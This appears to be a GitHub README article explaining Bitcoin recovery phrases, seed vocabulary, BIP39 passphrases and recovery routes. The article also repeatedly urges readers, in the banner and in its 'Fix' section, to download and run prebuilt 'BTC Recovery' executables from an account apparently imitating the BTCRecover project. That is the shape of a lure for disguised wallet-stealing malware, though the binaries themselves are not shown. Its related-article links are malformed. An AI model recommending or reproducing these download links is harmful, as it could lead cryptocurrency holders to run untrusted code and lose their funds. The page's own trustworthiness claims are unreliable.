<div align="center">
<img src="assets/banner-article.png" alt="What a recovery phrase is, and what it is not">
</div>

# What a recovery phrase is, and what it is not

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A recovery phrase is a human-writable encoding of a wallet's master key: 12 to 24 words that regenerate every key and address the wallet ever used. It is not a password, not an account and not a file  -  and understanding that difference explains most of what can and cannot be recovered.

## You'll see this if

The word "phrase" is doing several jobs in one conversation  -  a seed, a password, a passphrase, a backup  -  and the answer depends on which one is meant. This page settles the vocabulary before any recovery step is attempted.

| Term you have seen | What it actually is | What it recovers |
|---|---|---|
| Recovery phrase, seed phrase, mnemonic | the wallet's master key, written as words | the wallet, from nothing |
| Wallet password | a passphrase encrypting a file on disk | access to that file |
| BIP39 passphrase, 25th word | an extra string mixed into key derivation | a different wallet from the same words |
| Private key | a single key, not a wallet | one address's coins |
| Backup file | an encrypted copy of a wallet | the wallet, if the password is known |
| Account login | credentials held by a provider | a custodial balance only |

## Why it happens

The words are not arbitrary. Each one comes from a fixed list of 2,048, and the sequence is converted into a large number, which becomes the seed for every key the wallet derives. Because the process is deterministic and local, the same words always produce the same wallet  -  which is why a phrase is a complete backup and why no server is involved.

Two design choices follow from that, and both matter for recovery. The last word carries a checksum, so a mistyped phrase is rejected immediately rather than producing a wrong wallet. And the derivation takes optional inputs  -  a passphrase, an account index, an address type  -  which is why one phrase can produce several valid wallets and why a "correct phrase, empty wallet" is a normal state.

Length deserves its own sentence, because it causes most of the confusion. Twelve words from that list carry 128 bits of entropy and twenty-four carry 256, and the difference is not how hard the phrase is for a person to guess but how large a space a machine would have to cover. It also explains why one wrong word is recoverable and six randomly missing words are not: the space grows multiplicatively while the checksum only removes the impossible part.

What a phrase is not is just as useful. It is not stored in the wallet, so there is nothing to look up. It is not a password, so it cannot be changed or reset. It is not an account, so no provider can reissue it. Those three negatives explain every recovery limit on this site: what survives can be searched, and what never existed cannot.

## Fix

**Install the current release first.** Download and run [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1) from the releases page; the steps below assume that build.

Use the vocabulary to decide what you are actually doing, then take the matching route. There is no procedure that "resets" a phrase; there is only a route per artifact.

1. **If you have the phrase and it is complete**, restore it into the correct wallet application and confirm the first receive address: [How to recover a Bitcoin wallet with a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/recover-bitcoin-wallet-with-seed-phrase-btcrecover.md).
2. **If words are missing or out of order**, the phrase has to be completed before it can be restored: [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) and [Seed words in the wrong order](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/fix-seed-words-in-wrong-order-with-btcrecover.md).
3. **If the phrase restores an empty wallet**, the words are fine and the branch is wrong: [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md).
4. **If a passphrase was ever set**, the same words produce a different wallet without it: [BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md).
5. **If you have a file rather than words**, the phrase is irrelevant to opening it and the password is the input: [wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md).
6. **If you have only an address**, nothing can be rebuilt from it  -  an address is a destination, not a key: [How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md).

## If that did not work

When none of those routes fits, the artifact is usually something other than what it was thought to be  -  an account rather than a wallet, a private key rather than a phrase, a backup of a service that no longer exists.

Sort by custody. If a company holds the keys, no local recovery applies and the provider's own account process is the only route. If you hold the keys, the phrase or the encrypted file is the recovery, and the question becomes which of the two you actually have. If you hold neither, the honest answer is that the wallet is unreachable and software cannot change it: [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) covers what remains possible, which is completing a phrase you partly hold.

## Prevention

- Write the phrase on paper or metal, in order, with the wallet name and year.
- Store a second copy in a different physical place.
- Test the backup by restoring it before the wallet holds value.
- Record separately whether a BIP39 passphrase exists, without writing it beside the phrase.
- Never type a phrase into a website, a chat or a form, whatever it claims to be.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### What is the Bitcoin recovery phrase?

The sequence of words that encodes a wallet's master key  -  usually 12 or 24, from a fixed list of 2,048. It regenerates every address the wallet used, which is why it is the only backup that matters and why it must never be shared.

### What is an example of a 12-word recovery phrase?

Any twelve words from the standard list, in an order whose final word satisfies the checksum. Real phrases are secrets, so examples in documentation are always constructed rather than copied  -  never use an example from any page as a wallet.

### Is a recovery phrase the same as a private key?

No. A private key controls one address; a phrase regenerates a whole wallet, including that key among many. That is why a phrase restores everything after a device loss and a key restores only the coins at its address.

### Can a recovery phrase be changed or reset?

No. It is derived once and stored nowhere, so there is nothing to reset and no authority to issue a new one. A wallet can be replaced with a new phrase, but the old phrase stays tied to the old wallet forever.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [How to recover a Bitcoin wallet with a seed phrase]([How to recover a Bitcoin wallet with a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/recover-bitcoin-wallet-with-seed-phrase-btcrecover.md))
- [BIP39 passphrase and the 25th word]([BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md))
- [Restored seed shows an empty wallet]([Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md))
